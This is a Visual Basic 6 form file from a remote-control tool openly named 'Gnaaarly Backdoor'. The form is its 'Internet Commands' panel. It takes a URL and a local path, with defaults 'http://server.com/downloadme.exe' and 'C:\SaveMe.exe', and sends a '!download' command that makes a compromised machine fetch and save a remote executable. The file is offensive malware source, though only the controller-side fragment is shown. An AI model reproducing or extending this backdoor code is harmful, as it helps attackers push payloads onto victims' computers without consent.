VERSION 5.00
Begin VB.Form frmInternet 
   BorderStyle     =   4  'Festes Werkzeugfenster
   Caption         =   "Gnaaarly Backdoor - Internet Commands"
   ClientHeight    =   2025
   ClientLeft      =   45
   ClientTop       =   285
   ClientWidth     =   5535
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   2025
   ScaleWidth      =   5535
   StartUpPosition =   2  'Bildschirmmitte
   Begin VB.CommandButton cmdBack 
      Caption         =   "BACK"
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   9.75
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   375
      Left            =   120
      TabIndex        =   5
      Top             =   1560
      Width           =   5295
   End
   Begin VB.Frame fraDownload 
      Caption         =   "DOWNLOAD A FILE (HTTP)"
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   9.75
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   1455
      Left            =   0
      TabIndex        =   0
      Top             =   0
      Width           =   5535
      Begin VB.CommandButton cmdDownload 
         Caption         =   "DOWNLOAD"
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   9.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   255
         Left            =   120
         TabIndex        =   4
         Top             =   1080
         Width           =   5295
      End
      Begin VB.TextBox txtSavePath 
         Appearance      =   0  '2D
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   9.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   285
         Left            =   1080
         TabIndex        =   3
         Text            =   "C:\SaveMe.exe"
         Top             =   720
         Width           =   4335
      End
      Begin VB.TextBox txtUrl 
         Appearance      =   0  '2D
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   9.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   285
         Left            =   1080
         TabIndex        =   2
         Text            =   "http://server.com/downloadme.exe"
         Top             =   360
         Width           =   4335
      End
      Begin VB.Label lblDownload 
         Caption         =   "!download"
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   9.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   255
         Left            =   120
         TabIndex        =   1
         Top             =   360
         Width           =   855
      End
   End
End
Attribute VB_Name = "frmInternet"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Sub cmdBack_Click()
    frmInternet.Hide
End Sub

Private Sub cmdDownload_Click()
    frmMain.txtSend.Text = "!download '" & txtUrl.Text & "' '" & txtSavePath.Text & "'"
    SendCommand
End Sub
